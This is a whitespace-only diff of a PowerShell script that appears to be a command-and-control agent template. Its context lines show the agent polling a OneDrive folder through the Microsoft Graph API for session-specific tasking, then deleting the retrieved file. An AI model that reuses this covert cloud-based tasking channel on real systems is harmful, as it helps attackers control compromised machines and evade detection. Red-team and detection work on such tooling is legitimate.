@@ -67,7 +67,6 @@ $Script:GetTask = {
         $wc = (& $GetWebClient);
 
         $TaskingsFolder = "{{ base_folder }}/{{ taskings_folder }}";
-
         #If we haven't sent a message recently...
         if ($Script:lastseen.addseconds($Script:AgentDelay * 2) -lt (get-date))
         {
@@ -76,7 +75,6 @@ $Script:GetTask = {
         $Script:MissedCheckins = 0;
 
         $data = $wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$($Script:SessionID).txt:/content");
-
         if ($data -and ($data.length -ne 0)) {
             $wc = (& $GetWebClient);
             $null = $wc.UploadString("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$($Script:SessionID).txt", "DELETE", "");
